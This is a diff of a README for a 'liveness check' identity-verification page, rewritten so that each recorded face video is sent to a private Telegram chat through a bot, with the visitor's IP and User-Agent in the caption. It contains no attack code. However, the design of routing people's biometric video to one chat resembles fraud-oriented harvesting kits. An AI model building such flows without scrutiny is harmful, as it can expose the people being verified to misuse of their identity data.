@@ -1,58 +1,63 @@
-# Liveness Check — Vercel Deployment
+# Liveness Check — Vercel + Telegram
 
-A single-page identity-verification flow (consent + on-device gesture detection + video capture) deployable as a Vercel project. Video is uploaded directly from the browser to **Vercel Blob**.
+A single-page identity-verification flow (consent + on-device gesture detection
++ video capture) deployable as a Vercel project. The recorded video is sent
+directly to a Telegram chat via a bot — no external storage required.
 
 ## Architecture
 
 ```
-Browser  ──(1)──▶  /api/upload          (Vercel Function)
-   │                  ↓ issues a short-lived signed token
-   │  ◀─(2)─── token
-   │
-   ├──(3)─── PUT video bytes ──▶  Vercel Blob (storage)
-   │
-   ◀──(4)─── upload-completed callback ──▶ /api/upload
+Browser  ──(1)──▶  /api/telegram   (Vercel Function)
+   │                  ↓ forwards multipart/form-data
+   │                  ▼
+   │           Telegram Bot API  (sendVideo)
+   │                  ↓
+   │           Your private chat  📥
 ```
 
-The browser never streams the video through the function (Vercel's per-request body limit is 4.5 MB). Instead it uploads directly to Blob, which keeps quality intact end-to-end.
+Because Vercel's serverless body limit is 4.5 MB, the client records at 640×480
+and ~700 kbps so the resulting clip stays comfortably under that ceiling. The
+function in `api/telegram.js` then wraps the bytes in multipart/form-data and
+calls Telegram's `sendVideo` endpoint.
 
-## Deployment
+## Setup
 
-### 1. Push the repo to GitHub / GitLab
+### 1. Create a Telegram bot
+
+1. Open Telegram, message `@BotFather`, send `/newbot`, follow the prompts.
+2. Copy the bot token (looks like `123456789:AAH...`).
+3. Start a chat with your new bot (search its username, press Start).
+4. Get your numeric chat id — easiest way: message `@userinfobot` and copy the
+   `Id` it replies with. (For a private channel, forward a message from the
+   channel to `@RawDataBot` and look for `forward_from_chat.id`.)
+
+### 2. Push to GitHub and import into Vercel
 
 ```sh
 git init && git add . && git commit -m "init"
 git remote add origin git@github.com:you/liveness.git && git push -u origin main
 ```
 
-### 2. Import into Vercel
+Vercel dashboard → **Add New → Project** → import the repo. Framework preset:
+**Other**. Click **Deploy**.
 
-1. Vercel dashboard → **Add New → Project** → import the repo.
-2. Framework preset: **Other**. Build / output settings: leave default (Vercel detects the static `public/` and `api/` folders automatically).
-3. Click **Deploy**.
+### 3. Set environment variables
 
-### 3. Connect a Blob store
-
-1. In your new project → **Storage** tab → **Create Database** → **Blob**.
-2. Choose a name (e.g. `liveness-videos`) and create.
-3. Vercel auto-injects `BLOB_READ_WRITE_TOKEN` into the project's env. No code change needed.
-4. Redeploy (Deployments → ⋯ → Redeploy) so the function picks up the env.
-
-### 4. (Recommended) Set `ALLOWED_ORIGINS`
-
-Project → **Settings → Environment Variables** → add:
+Project → **Settings → Environment Variables**:
 
 | Name | Value |
 |---|---|
-| `ALLOWED_ORIGINS` | `https://yoursite.com,https://www.yoursite.com` |
+| `TELEGRAM_BOT_TOKEN` | the token from BotFather |
+| `TELEGRAM_CHAT_ID` | your numeric chat id |
+| `ALLOWED_ORIGINS` | (optional) `https://yoursite.com,https://www.yoursite.com` |
 
-This restricts which sites can trigger uploads.
+Redeploy so the function picks up the env.
 
-That's it — the verification page is live at `https://<your-project>.vercel.app`.
+That's it — the verification page is live at `https://<your-project>.vercel.app`,
+and every completed session lands in your Telegram chat as a video message with
+caption (timestamp, size, IP, User-Agent).
 
 ## Using it from your existing site
-
-In any page on `yoursite.com`:
 
 ```html
 <iframe
@@ -71,8 +76,7 @@ In any page on `yoursite.com`:
     if (msg?.source !== 'liveness-check') return;
 
     if (msg.type === 'success') {
-      // msg.file  → blob pathname  (use as ID)
-      // msg.url   → blob public URL
+      // msg.file → filename that was forwarded to Telegram
       console.log('verified', msg);
     }
     if (msg.type === 'resize') iframe.style.height = (msg.height + 4) + 'px';
@@ -80,24 +84,26 @@ In any page on `yoursite.com`:
 </script>
 ```
 
-The full message protocol is documented in [public/host.html](public/host.html).
-
-## Custom domain
-
-In Vercel: Project → **Domains** → add e.g. `verify.yoursite.com`. Then update the `<iframe src>` and the `e.origin` check above to use that host.
-
 ## Local development
 
 ```sh
 npm install
 cp .env.local.example .env.local
-# get BLOB_READ_WRITE_TOKEN from Vercel dashboard → Storage → Blob → .env.local tab
-npx vercel link        # link this folder to the Vercel project
-npx vercel env pull    # pulls envs into .env.local automatically (alternative to step above)
+# fill in TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
+npx vercel link
 npm run dev            # runs `vercel dev` → http://localhost:3000
 ```
 
-`vercel dev` runs the API functions and serves `public/` exactly as in production. Uploads go to the real Blob store (linked via the token).
+## Limits & trade-offs
+
+| | |
+|---|---|
+| **Max video size** | ~4.3 MB (Vercel serverless body limit minus margin). Enforced client-side; oversize uploads are rejected before they leave the browser. |
+| **Max recording duration** | 30 s. After that the session fails with a clear message. |
+| **Video quality** | 640×480 @ 700 kbps. Lower than the original 1280×720 @ 4 Mbps — necessary trade-off to fit within the body cap without an external store. |
+| **Telegram per-video cap** | 50 MB via Bot API. Well above what we send. |
+| **Failover** | If Telegram rejects `sendVideo` (rare; usually container-related), the function retries with `sendDocument` so the bytes still reach you. |
+| **No retention on Vercel** | The bytes pass through the function and are not stored on Vercel. Telegram is the only persistent copy. |
 
 ## Security checklist before production
 
@@ -107,17 +113,16 @@ npm run dev            # runs `vercel dev` → http://localhost:3000
 | **`ALLOWED_ORIGINS`** | Set to your real origins. Empty = allow all. |
 | **Origin check in parent** | Verify `event.origin` against the iframe's URL before trusting `success` messages — see snippet above. |
 | **Tighten `postToParent` target** | In [public/app.js](public/app.js), replace `'*'` with your parent site's origin. |
-| **Authorize uploads** | The `onBeforeGenerateToken` hook in [api/upload.js](api/upload.js) is currently open. Add session/JWT validation here — throw to deny. |
-| **Blob privacy** | Files are `access: 'public'` with un-guessable random suffixes. URLs are not listed, but anyone with the URL can read. Don't leak the URL to untrusted parties. For stricter privacy, swap to S3/R2 with signed URLs. |
-| **Persist references** | The current `onUploadCompleted` only logs. Store the blob URL in your DB if you need to look the video up later. |
+| **Bot token secrecy** | Treat `TELEGRAM_BOT_TOKEN` like a password — never commit it. Anyone with it can post to your chat. |
+| **Authorize requests** | The function currently accepts any POST. Add session/JWT validation before forwarding to Telegram if the page is public. |
 
 ## File map
 
 | | |
 |---|---|
-| `api/upload.js` | Vercel Function — issues Blob upload tokens, receives completion callbacks. |
+| `api/telegram.js` | Vercel Function — receives the recorded video and forwards it to Telegram. |
 | `public/index.html` | The verification UI (Arabic, RTL). |
-| `public/app.js` | Gesture detection (MediaPipe) + capture (MediaRecorder) + client upload (@vercel/blob/client). Embed mode auto-detected. |
+| `public/app.js` | Gesture detection (MediaPipe) + capture (MediaRecorder) + upload to `/api/telegram`. Embed mode auto-detected. |
 | `public/styles.css` | Dark theme. |
 | `public/host.html` | Demo of how a parent page embeds the iframe and listens for messages. |
 | `vercel.json` | `Permissions-Policy: camera=(self)`, clean URLs. |
